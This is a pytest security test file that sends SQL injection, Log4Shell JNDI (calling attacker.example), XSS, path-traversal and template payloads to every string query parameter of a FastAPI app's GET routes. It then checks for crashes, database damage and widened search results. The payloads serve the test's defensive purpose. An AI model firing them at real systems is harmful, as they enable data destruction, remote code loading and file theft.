"""Injection — hostile text in every string query parameter is data, never code.

    pytest tests/security/test_injection_sweep.py -q

Generated from the OpenAPI schema: every GET route in the tenant-scoped API that
takes a string query parameter (search boxes, filters, sort keys, cursors) is
called with SQL-injection, LIKE-wildcard, control-character and template
payloads. A 5xx means the text reached something that interpreted it, or crashed
on it. After the sweep the database must be intact and a boolean-injection
probe (`' OR '1'='1`) must not widen a search.
"""

from __future__ import annotations

import collections
import re
from typing import Any

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import func, select, text
from sqlalchemy.orm import Session

from app.main import app
from app.models.user import User
from app.models.work_item import WorkItem
from tests.conftest import Fixture
from tests.security.plans import put_on_plan
from tests.security.route_sweep import Op, Sweep
from tests.security.test_cross_tenant_sweep import _Crashed, _ids, _org_ws_ops

PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1; SELECT pg_sleep(5)--",
    "\" OR \"\"=\"",
    "%' AND 1=1 --",
    "\\",
    "%",
    "_",
    "{{7*7}}",
    "${jndi:ldap://attacker.example/a}",
    "<script>alert(1)</script>",
    "\x00",
    "A" * 5000,
    "../../../../etc/passwd",
    "id DESC; DELETE FROM users",
    "(SELECT 1)",
]
SKIP = re.compile(r"/(archive|leave|restore)$")


def _string_query_params(sweep: Sweep, op: Op) -> list[str]:
    names = []
    for param in op.params:
        if param.get("in") != "query":
            continue
        schema = sweep._resolve(param.get("schema", {}))  # noqa: SLF001
        options = [schema] + [sweep._resolve(o) for o in schema.get("anyOf", []) + schema.get("oneOf", [])]  # noqa: SLF001
        if any(o.get("type") == "string" and not o.get("enum") for o in options):
            names.append(param["name"])
    return names


@pytest.fixture()
def world(db_session: Session, tenant: Fixture):
    put_on_plan(db_session, tenant.organization, "enterprise")
    return Sweep(app), _ids(tenant.organization.id, tenant.workspace.id)


def test_the_sweep_finds_a_meaningful_number_of_string_parameters(world) -> None:
    sweep, _ = world
    targets = [
        (op, name)
        for op in _org_ws_ops(sweep)
        if op.method == "get"
        for name in _string_query_params(sweep, op)
    ]
    assert len(targets) >= 20, len(targets)


def test_hostile_text_in_any_string_query_parameter_never_crashes_a_route(
    client: TestClient, db_session: Session, tenant: Fixture, world
) -> None:
    sweep, ids = world
    users_before = db_session.execute(select(func.count()).select_from(User)).scalar_one()
    crashed: list[str] = []
    probes = 0
    counts: collections.Counter[int] = collections.Counter()
    for op in _org_ws_ops(sweep):
        if op.method != "get" or SKIP.search(op.path):
            continue
        for name in _string_query_params(sweep, op):
            for payload in PAYLOADS:
                url, query, _ = sweep.build(op, ids)
                query = {**query, name: payload}
                try:
                    response = client.get(url, params=query, headers=tenant.owner.headers)
                except Exception as error:  # noqa: BLE001
                    response = _Crashed(error)
                finally:
                    db_session.rollback()
                probes += 1
                counts[response.status_code] += 1
                if response.status_code >= 500:
                    crashed.append(f"{op.key.replace('/api/v1', '')} ?{name}={payload[:24]!r} -> {response.status_code} {getattr(response, 'text', '')[:80]}")
    assert probes >= 300, probes
    assert not crashed, f"{len(crashed)} hostile inputs crashed a route:\n  " + "\n  ".join(crashed[:40])
    db_session.expire_all()
    assert db_session.execute(select(func.count()).select_from(User)).scalar_one() == users_before
    assert db_session.execute(text("select to_regclass('public.users')")).scalar_one() == "users"


def test_a_boolean_injection_does_not_widen_a_search(
    client: TestClient, db_session: Session, tenant: Fixture, work_item_factory, world
) -> None:
    for n in range(3):
        item = work_item_factory(summary=f"quarterly report number {n}", original_filename=f"quarterly-report-{n}.pdf")
        item.status = "COMPLETED"  # the factory's legacy "PROCESSED" is not a valid response status
    db_session.commit()
    ws = tenant.workspace.id

    def hits(q: str) -> int:
        response = client.get(f"/api/v1/workspaces/{ws}/work-items", params={"search": q}, headers=tenant.owner.headers)
        assert response.status_code == 200, (q, response.status_code, response.text[:150])
        body = response.json()
        items = body["items"] if isinstance(body, dict) and "items" in body else body
        return len(items)

    baseline = hits("quarterly")
    assert baseline == 3
    assert hits("nomatchatall") == 0
    assert hits("' OR '1'='1") == 0
    assert hits("quarterly' OR '1'='1") == 0
    assert hits("%") <= baseline  # a LIKE wildcard typed by a user is literal text, not "everything"
    assert db_session.execute(select(func.count()).select_from(WorkItem)).scalar_one() == 3
